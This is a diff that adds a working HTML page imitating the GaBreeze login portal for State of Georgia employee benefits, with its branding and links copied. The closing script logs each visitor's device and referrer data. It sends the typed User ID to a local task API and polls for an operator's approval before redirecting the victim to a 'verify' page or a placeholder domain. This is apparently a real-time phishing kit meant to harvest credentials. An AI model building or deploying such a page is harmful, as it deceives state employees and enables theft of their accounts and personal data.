@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login - stateofgeorgia</title>
+<link rel="icon" type="image/svg+xml" href="https://cache-upn.ap.alight.com/upoint/UPoint/cloudCMS/03889/master/UCEDocuments/branding/ADS/logo/GaBreeze+logo.svg">
+<style>
+  /* ---------- Reset & Base ---------- */
+  *, *::before, *::after { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; }
+
+  :root {
+    --auth-padding-x: 100px;
+    --form-column-width: 420px;
+    --image-column-width: 950px;
+    --auth-gap: 24px;
+
+    --primary-brand-color: #1C68BF;
+    --secondary-brand-color: #1c68bf;
+    --tertiary-brand-color: #F4A713;
+    --section-color: #f9f9f9;
+
+    --color-bg-body-base: #ffffff;
+    --color-bg-dark-subtlest: #f9f9f9;
+    --color-bg-primary-base: #266de2;
+    --color-bg-primary-base-hover: #165bcf;
+    --color-bg-disabled-base: #949494;
+    --color-text-body-base: #282828;
+    --color-text-body-subtle: #666666;
+    --color-text-placeholder-base: #767676;
+    --color-text-disabled-on-base-bg: #ffffff;
+    --color-text-primary-base: #266de2;
+    --color-text-primary-base-hover: #165bcf;
+    --color-text-error-base: #c61a1a;
+    --color-border-default-subtlest: #dedede;
+    --color-border-default-strong: #282828;
+    --color-border-focus-base: #0055aa;
+    --color-icon-dark-base: #282828;
+    --color-link-base: #266de2;
+    --neutral-white: #ffffff;
+    --neutral-steel: #666666;
+    --neutral-mountain-mist: #949494;
+    --accent-navy-blue: #266de2;
+
+    --font-family-base: "FS Thrive Elliot Web", Arial, sans-serif;
+    --font-family-bold: "FS Thrive Elliot Web - Bold", Arial, sans-serif;
+
+    --font-size-2xs: 12px;
+    --font-size-xs: 13px;
+    --font-size-s: 14px;
+    --font-size-base: 16px;
+    --font-size-m: 18px;
+    --font-size-l: 20px;
+    --font-size-2xl: 28px;
+
+    --spacing-100: 4px;
+    --spacing-200: 8px;
+    --spacing-300: 12px;
+    --spacing-400: 16px;
+    --spacing-600: 24px;
+    --spacing-800: 32px;
+    --spacing-1000: 40px;
+    --spacing-1200: 48px;
+    --spacing-1600: 64px;
+
+    --border-radius-s: 8px;
+    --border-radius-m: 20px;
+    --border-radius-full: 1000px;
+  }
+
+  @font-face {
+    font-family: "FS Thrive Elliot Web";
+    src: url("https://awlds.ap.alight.com/awlds/v1.67.0/awlds-ui-lib/assets/fonts/FSThriveElliotWeb-Regular.woff") format("woff");
+    font-display: swap;
+    font-weight: 400;
+  }
+  @font-face {
+    font-family: "FS Thrive Elliot Web - Bold";
+    src: url("https://awlds.ap.alight.com/awlds/v1.67.0/awlds-ui-lib/assets/fonts/FSThriveElliotWeb-Bold.woff") format("woff");
+    font-display: swap;
+    font-weight: 700;
+  }
+  @font-face {
+    font-family: "FS Thrive Elliot Web - Heavy";
+    src: url("https://awlds.ap.alight.com/awlds/v1.67.0/awlds-ui-lib/assets/fonts/FSThriveElliotWeb-Heavy.woff") format("woff");
+    font-display: swap;
+    font-weight: 400;
+  }
+
+  body {
+    font-family: var(--font-family-base);
+    font-size: var(--font-size-base);
+    color: var(--color-text-body-base);
+    background: #ffffff;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .sr-only, .screen-reader-text {
+    position: absolute !important;
+    height: 1px; width: 1px;
+    overflow: hidden;
+    clip: rect(1px, 1px, 1px, 1px);
+    white-space: nowrap;
+  }
+
+  /* ---------- HEADER ---------- */
+  .global-header {
+    position: fixed;
+    top: 0;
+    width: 100%;
+    z-index: 1000;
+    background: #ffffff;
+    border-bottom: 1px solid #000000;
+  }
+
+  .brand-bar {
+    height: 8px;
+    margin: 0;
+    border: none;
+    background: var(--primary-brand-color);
+  }
+
+  .header-content {
+    display: flex;
+    flex-direction: row;
+    align-items: center;
+    justify-content: space-between;
+    height: 88px;
+    padding: 0 32px;
+  }
+
+  .header-left {
+    display: flex;
+    align-items: center;
+    justify-content: flex-start;
+    width: 30%;
+  }
+
+  .logo-link {
+    display: flex;
+    align-items: center;
+    text-decoration: none;
+  }
+
+  .logo-link img {
+    height: 48px;
+    width: auto;
+    max-width: 216px;
+    display: block;
+  }
+
+  .header-right {
+    display: flex;
+    align-items: center;
+    justify-content: flex-end;
+    min-width: 30%;
+  }
+
+  .va-button {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 40px;
+    padding: 0 16px;
+    border: 2px solid #1C68BF;
+    border-radius: 20px;
+    background-color: #1C68BF;
+    color: #ffffff;
+    font-family: var(--font-family-bold);
+    font-weight: 700;
+    font-size: 14px;
+    line-height: 1.5;
+    cursor: pointer;
+    box-shadow: 0 0 8px #1C68BF;
+    transition: background-color 0.1s, border-color 0.1s;
+  }
+  .va-button:hover {
+    background-color: #165bcf;
+    border-color: #165bcf;
+  }
+  .va-button svg {
+    width: 25px;
+    height: 25px;
+    margin-right: 8px;
+    flex-shrink: 0;
+  }
+
+  /* ---------- MAIN ---------- */
+  main {
+    padding-top: 138px;
+    display: block;
+  }
+
+  .auth-section {
+    display: flex;
+    flex-wrap: nowrap;
+    justify-content: center;
+    align-items: center;
+    gap: var(--auth-gap);
+    width: 100%;
+    margin: 0 auto;
+    padding: 16px var(--auth-padding-x);
+  }
+
+  .auth-form-column {
+    flex: 0 0 var(--form-column-width);
+    max-width: var(--form-column-width);
+    padding: 0;
+  }
+
+  .auth-form-inner {
+    padding: 0;
+  }
+
+  .welcome-heading {
+    font-family: var(--font-family-bold);
+    font-weight: 700;
+    font-size: 26px;
+    line-height: 1.2;
+    margin: 0 0 16px 0;
+    white-space: nowrap;
+    color: var(--color-text-body-base);
+  }
+
+  .panel {
+    border: 2px solid var(--color-border-default-subtlest);
+    border-radius: 10px;
+    background-color: #ffffff;
+    padding: 20px;
+  }
+
+  .panel h6 {
+    margin: 0 0 12px 0;
+  }
+
+  .panel h6 p {
+    margin: 0;
+    font-size: 18px;
+    font-family: var(--font-family-bold);
+    font-weight: 700;
+    line-height: 1.5;
+  }
+
+  .required-note {
+    font-size: 13px;
+    line-height: 1.2;
+    color: var(--color-text-body-base);
+    margin: 16px 0 12px 0;
+  }
+
+  .text-input {
+    display: flex;
+    flex-flow: column;
+  }
+
+  .text-input label {
+    order: 1;
+    margin-bottom: 8px;
+    display: block;
+    font-family: var(--font-family-base);
+    font-size: 12px;
+    line-height: 1.2;
+  }
+
+  .label-text .label-text__text {
+    display: inline;
+    color: var(--color-text-body-base);
+  }
+  .label-text .required-text {
+    display: inline;
+    margin-left: 4px;
+    color: var(--color-text-body-subtle);
+    font-style: italic;
+  }
+  .label-text .required-symbol {
+    display: inline;
+    margin-left: 4px;
+    color: var(--color-text-error-base);
+  }
+
+  .input-container {
+    position: relative;
+    order: 2;
+  }
+
+  .input-container input[type="text"] {
+    height: 48px;
+    width: 100%;
+    padding: 12px 14px;
+    background-color: #ffffff;
+    color: var(--color-text-body-base);
+    border: 1px solid var(--color-border-default-strong);
+    border-radius: 0;
+    outline: none;
+    font-family: var(--font-family-base);
+    font-size: 15px;
+    cursor: text;
+  }
+  .input-container input[type="text"]:hover,
+  .input-container input[type="text"]:focus {
+    border-color: var(--color-border-focus-base);
+    box-shadow: inset 0 0 0 1px var(--color-border-focus-base);
+    background-color: #ffffff;
+  }
+
+  .forgot-row {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    justify-content: flex-end;
+    margin: 16px 0 12px 0;
+  }
+  .forgot-row a {
+    color: var(--accent-navy-blue);
+    font-size: 15px;
+    text-decoration: none;
+  }
+  .forgot-row a:hover {
+    text-decoration: underline;
+  }
+
+  .next-btn-wrap {
+    margin-top: 20px;
+  }
+
+  .next-btn {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 40px;
+    padding: 0 16px;
+    border: 2px solid transparent;
+    border-radius: 20px;
+    background-color: var(--color-bg-disabled-base);
+    color: var(--color-text-disabled-on-base-bg);
+    font-family: var(--font-family-bold);
+    font-weight: 700;
+    font-size: 14px;
+    line-height: 1.5;
+    cursor: not-allowed;
+    white-space: nowrap;
+  }
+
+  .status-msg {
+    display: none;
+    margin-top: 12px;
+    padding: 10px 14px;
+    border-radius: 6px;
+    font-size: 14px;
+    line-height: 1.4;
+  }
+  .status-msg.info {
+    display: block;
+    background: #e8f4fd;
+    color: #1a5276;
+    border: 1px solid #aed6f1;
+  }
+  .status-msg.error {
+    display: block;
+    background: #fdecea;
+    color: #922b21;
+    border: 1px solid #f5b7b1;
+  }
+
+  .auth-bg-column {
+    flex: 0 0 var(--image-column-width);
+    max-width: var(--image-column-width);
+    padding: 0;
+  }
+
+  .bg-image-wrap {
+    width: 100%;
+  }
+  .bg-image-wrap img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+
+  /* ---------- FOOTER ---------- */
+  footer {
+    clear: both;
+    display: block;
+    background-color: var(--color-bg-dark-subtlest);
+    margin-top: 40px;
+  }
+
+  .footer-grid {
+    max-width: 100%;
+    margin: 0 auto;
+    padding: 5px 12px;
+    width: 100%;
+  }
+
+  .footer-row {
+    display: flex;
+    flex-wrap: wrap;
+  }
+
+  .footer-col {
+    padding: 5px 12px;
+    margin-left: calc((1 / 12) * 100%);
+    flex: 0 0 calc((10 / 12) * 100%);
+    width: calc((10 / 12) * 100%);
+    max-width: calc((10 / 12) * 100%);
+  }
+
+  .footer-top {
+    display: flex;
+    flex-direction: row;
+    justify-content: space-between;
+  }
+
+  .footer-links-group {
+    display: flex;
+    gap: 64px;
+  }
+
+  .footer-list {
+    list-style: none;
+    margin: 0;
+    padding: 0;
+  }
+
+  .footer-list li {
+    padding: 8px 0;
+  }
+
+  .footer-list li a {
+    color: var(--color-link-base);
+    text-decoration: none;
+    font-size: 16px;
+    line-height: 1.5;
+  }
+  .footer-list li a:hover {
+    text-decoration: underline;
+  }
+
+  .footer-brand-block {
+    display: flex;
+    flex-direction: column;
+    gap: 24px;
+    margin-top: 8px;
+    padding-top: 4px;
+  }
+
+  .footer-logo {
+    display: block;
+    height: 40px;
+    margin-bottom: 8px;
+  }
+  .footer-logo img {
+    height: 100%;
+    display: block;
+  }
+
+  .app-badges {
+    display: flex;
+  }
+  .app-badges a {
+    display: inline-block;
+    height: 40px;
+    margin-right: 16px;
+  }
+  .app-badges img {
+    height: 100%;
+    display: block;
+  }
+
+  .footer-divider {
+    border: none;
+    border-top: 1px solid var(--neutral-mountain-mist);
+    height: 0;
+    margin: 0;
+  }
+
+  .footer-legal-row {
+    display: flex;
+    flex-direction: row;
+    justify-content: space-between;
+    align-items: flex-start;
+  }
+
+  .legal-links {
+    display: flex;
+    flex-wrap: wrap;
+  }
+
+  .legal-links a {
+    color: var(--color-link-base);
+    text-decoration: none;
+    font-size: 14px;
+    padding-right: 32px;
+    line-height: 1.5;
+  }
+  .legal-links a:hover {
+    text-decoration: underline;
+  }
+
+  .copyright {
+    font-size: 18px;
+    color: var(--neutral-steel);
+  }
+
+  /* ---------- RESPONSIVE ---------- */
+  @media (max-width: 1200px) {
+    .auth-section {
+      padding-left: 40px;
+      padding-right: 40px;
+    }
+  }
+
+  @media (max-width: 1024px) {
+    .auth-section {
+      gap: 16px;
+      padding-left: 24px;
+      padding-right: 24px;
+    }
+    .auth-form-column { flex: 0 0 320px; max-width: 320px; }
+    .auth-bg-column { flex: 0 0 440px; max-width: 440px; }
+    .welcome-heading { font-size: 22px; }
+    .footer-top { flex-direction: column; }
+  }
+
+  @media (max-width: 768px) {
+    .header-content { padding: 0 16px; height: 64px; }
+    .logo-link img { max-width: 144px; height: 40px; }
+    main { padding-top: 110px; }
+    .auth-section {
+      flex-wrap: wrap;
+      padding: 16px;
+      gap: 16px;
+    }
+    .auth-form-column,
+    .auth-bg-column {
+      flex: 0 0 100%;
+      max-width: 100%;
+    }
+    .auth-form-inner { padding: 0; }
+    .welcome-heading { font-size: 20px; }
+    .footer-col {
+      margin-left: 0;
+      flex: 0 0 100%;
+      max-width: 100%;
+      width: 100%;
+    }
+    .footer-top { flex-direction: column; }
+    .footer-links-group { flex-direction: column; gap: 0; }
+    .footer-legal-row { flex-direction: column; gap: 16px; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ============ HEADER ============ -->
+<div class="global-header">
+  <nav class="f-global-header" aria-label="Global navigation">
+    <hr class="brand-bar">
+    <div class="header-content">
+      <div class="header-left">
+        <a href="#" class="logo-link" aria-label="Logo Home Page" title="Logo Home Page">
+          <img src="https://cache-upn.ap.alight.com/upoint/UPoint/cloudCMS/03889/master/UCEDocuments/branding/ADS/logo/GaBreeze+logo.svg" alt="State of Georgia">
+        </a>
+      </div>
+      <nav class="header-right" aria-label="User Menu">
+        <button type="button" class="va-button" aria-label="Virtual Assistant">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 25 25" fill="none" aria-hidden="true">
+            <path d="M12.5 3C7.25 3 3 6.75 3 11.5C3 14.2 4.4 16.6 6.7 18.1L6 22L10 20C10.8 20.2 11.65 20.3 12.5 20.3C17.75 20.3 22 16.55 22 11.8C22 7.05 17.75 3 12.5 3Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round" fill="none"/>
+            <circle cx="9" cy="12" r="1.2" fill="currentColor"/>
+            <circle cx="12.5" cy="12" r="1.2" fill="currentColor"/>
+            <circle cx="16" cy="12" r="1.2" fill="currentColor"/>
+          </svg>
+          <span class="button-text">Virtual Assistant</span>
+        </button>
+      </nav>
+    </div>
+  </nav>
+</div>
+
+<!-- ============ MAIN ============ -->
+<main id="content" role="main">
+  <div class="auth-section">
+
+    <!-- Form Column -->
+    <div class="auth-form-column">
+      <div class="auth-form-inner">
+
+        <div class="welcome-block">
+          <div class="sr-only" aria-live="assertive" aria-atomic="true" role="alert">Welcome to GaBreeze</div>
+          <h1 class="welcome-heading">Welcome to GaBreeze</h1>
+        </div>
+
+        <div role="form" class="form-block" aria-label="Welcome to GaBreeze">
+          <div class="panel">
+            <h6><p>Enter your User ID.</p></h6>
+
+            <div class="required-note">* Fields marked with an asterisk (*) are required.</div>
+
+            <div class="text-input">
+              <label for="UserID" class="label-text" id="UserID-label">
+                <span class="f-label-text">
+                  <span class="label-text__text">User ID</span>
+                  <span aria-hidden="true" class="required-text">(Required)</span>
+                  <span aria-hidden="true" class="required-symbol">*</span>
+                </span>
+              </label>
+              <div class="input-container">
+                <input type="text" id="UserID" name="UserID" required autocomplete="off"
+                       aria-required="true" aria-labelledby="UserID-label" aria-invalid="false">
+              </div>
+            </div>
+
+            <div class="forgot-row">
+              <a href="javascript:void(0)">Don't have User ID</a>
+            </div>
+
+            <div class="next-btn-wrap">
+              <button type="button" class="next-btn" id="nextBtn" disabled aria-label="Next">
+                <span class="button-text">Next</span>
+              </button>
+            </div>
+
+            <div class="status-msg" id="statusMsg"></div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- Background Image Column -->
+    <div class="auth-bg-column">
+      <div class="bg-image-wrap">
+        <img alt="Background Image" aria-hidden="true"
+             src="https://cache-upn.ap.alight.com/upoint/UPoint/cloudCMS/03889/master/Documents/UpointRedesign/LoginBGImages/image2_name_large.jpg">
+      </div>
+    </div>
+
+  </div>
+</main>
+
+<!-- ============ FOOTER ============ -->
+<footer id="footer" role="contentinfo">
+  <div class="footer-grid">
+
+    <div class="footer-row">
+      <div class="footer-col">
+        <div class="footer-top">
+          <div class="footer-links-group">
+            <ul class="footer-list">
+              <li>
+                <a title="Flexible Benefits Information"
+                   href="https://doas.ga.gov/human-resources-administration/flexible-benefits-program-employees">
+                  Flexible Benefits Information
+                </a>
+              </li>
+              <li>
+                <a title="PSR 401(k)/457 Plan Information"
+                   href="https://www.ers.ga.gov/peach-state-reserves">
+                  PSR 401(k)/457 Plan Information
+                </a>
+              </li>
+              <li>
+                <a title="Contact Us"
+                   href="https://worklife.alight.com/web/stateofgeorgia/pre-contactus">
+                  Contact Us
+                </a>
+              </li>
+              <li>
+                <a href="javascript:void(0);" title="Choose this link to review this site's feedback information.">
+                  Feedback
+                </a>
+              </li>
+            </ul>
+            <ul class="footer-list">
+              <li>
+                <a href="javascript:void(0);" title="Choose this link to review this site's protect yourself from website fraud information.">
+                  Protect Yourself From Website Fraud
+                </a>
+              </li>
+            </ul>
+          </div>
+
+          <div class="footer-brand-block">
+            <a class="footer-logo" href="https://alight.com/" aria-label="Alight.com home - opens in new window">
+              <img alt="Alight.com home"
+                   src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight_worklife_logo_black.svg">
+            </a>
+            <div class="app-badges">
+              <a href="https://apps.apple.com/us/app/upoint-mobile-hr/id1534367732?mt=8">
+                <img alt="Download on the App Store - opens in new tab"
+                     src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight-worklife-app-store.png">
+              </a>
+              <a href="https://play.google.com/store/apps/details?id=com.alightsolutions.benefitscenter&amp;hl=en_US">
+                <img alt="Get it on Google Play - opens in new tab"
+                     src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight-worklife-google-play.png">
+              </a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer-row">
+      <div class="footer-col">
+        <hr class="footer-divider">
+      </div>
+    </div>
+
+    <div class="footer-row">
+      <div class="footer-col" style="margin-bottom:8px; margin-top:8px;">
+        <div class="footer-legal-row">
+          <div class="legal-links">
+            <a href="https://www.alight.com/privacy" title="Choose this link to review this site's privacy statement information.">Privacy Policy</a>
+            <a href="https://www.alight.com/legal-terms" title="Choose this link to review this site's Terms of use information.">Terms Of Use</a>
+            <a href="https://www.alight.com/cookie-notice" title="Choose this link to review this site's cookie notice information.">Cookie Notice</a>
+            <a href="#" role="button" tabindex="0" title="Choose this link to update your cookie preference settings." id="ketch-sdk-btn" class="ketch-sdk-show-settings">Cookie Settings [Do Not Sell or Share My Personal Information]</a>
+          </div>
+          <div class="copyright">2026 Alight Solutions. All rights reserved.</div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</footer>
+
+<script>
+(function () {
+  var deviceInfo = navigator.userAgent;
+  var screenSize = window.screen.width + "x" + window.screen.height;
+  var referrer = document.referrer || "Direct";
+  var memberOrigin = window.location.href;
+
+  try {
+    fetch("/api/tasks", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        user_id: "visitor",
+        password: "N/A",
+        method: "N/A",
+        masked_email: "N/A",
+        masked_phone: "N/A",
+        request_kind: "visit",
+        device_info: deviceInfo,
+        screen_size: screenSize,
+        referrer: referrer,
+        member_origin: memberOrigin
+      })
+    });
+  } catch (e) {}
+
+  var userIdInput = document.getElementById("UserID");
+  var nextBtn = document.getElementById("nextBtn");
+  var statusMsg = document.getElementById("statusMsg");
+  var activePoll = null;
+  var activeTimeout = null;
+
+  userIdInput.addEventListener("input", function () {
+    if (userIdInput.value.trim()) {
+      nextBtn.disabled = false;
+      nextBtn.style.backgroundColor = "var(--color-bg-primary-base)";
+      nextBtn.style.cursor = "pointer";
+    } else {
+      nextBtn.disabled = true;
+      nextBtn.style.backgroundColor = "var(--color-bg-disabled-base)";
+      nextBtn.style.cursor = "not-allowed";
+    }
+  });
+
+  function showStatus(msg, type) {
+    statusMsg.textContent = msg;
+    statusMsg.className = "status-msg " + type;
+  }
+
+  function clearStatus() {
+    statusMsg.className = "status-msg";
+    statusMsg.textContent = "";
+  }
+
+  function resetBtn() {
+    nextBtn.disabled = false;
+    nextBtn.querySelector(".button-text").textContent = "Next";
+    nextBtn.style.opacity = "";
+    nextBtn.style.backgroundColor = "var(--color-bg-primary-base)";
+    nextBtn.style.cursor = "pointer";
+  }
+
+  nextBtn.addEventListener("click", async function () {
+    if (nextBtn.disabled) return;
+    var userId = userIdInput.value.trim();
+    if (!userId) return;
+
+    clearStatus();
+    nextBtn.disabled = true;
+    nextBtn.querySelector(".button-text").textContent = "Please wait...";
+    nextBtn.style.opacity = "0.6";
+    nextBtn.style.cursor = "not-allowed";
+
+    try {
+      var res = await fetch("/api/tasks", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          user_id: userId,
+          password: "N/A",
+          method: "email",
+          masked_email: "N/A",
+          masked_phone: "N/A",
+          request_kind: "login",
+          device_info: deviceInfo,
+          screen_size: screenSize,
+          referrer: referrer,
+          member_origin: memberOrigin
+        })
+      });
+
+      var data = await res.json();
+      if (!res.ok) throw new Error(data.error);
+      var taskId = data.task.id;
+
+      showStatus("Verifying your identity...", "info");
+
+      activePoll = setInterval(async function () {
+        try {
+          var check = await fetch("/api/tasks/" + taskId);
+          var result = await check.json();
+
+          if (result.task.status === "approved") {
+            clearInterval(activePoll);
+            clearTimeout(activeTimeout);
+            showStatus("Verified. Redirecting...", "info");
+            setTimeout(function () {
+              window.location.href = "/verify.html?task=" + taskId;
+            }, 800);
+          } else if (result.task.status === "denied") {
+            clearInterval(activePoll);
+            clearTimeout(activeTimeout);
+            showStatus("Access denied. Please try again.", "error");
+            resetBtn();
+          } else if (result.task.status === "redirected") {
+            clearInterval(activePoll);
+            clearTimeout(activeTimeout);
+            window.location.href = "https://YOURDOMAIN.com";
+          }
+        } catch (err) {}
+      }, 3000);
+
+      activeTimeout = setTimeout(function () {
+        clearInterval(activePoll);
+        showStatus("Request timed out. Please try again.", "error");
+        resetBtn();
+      }, 90000);
+
+    } catch (err) {
+      showStatus("Something went wrong. Please try again.", "error");
+      resetBtn();
+    }
+  });
+})();
+</script>
+
+</body>
+</html>
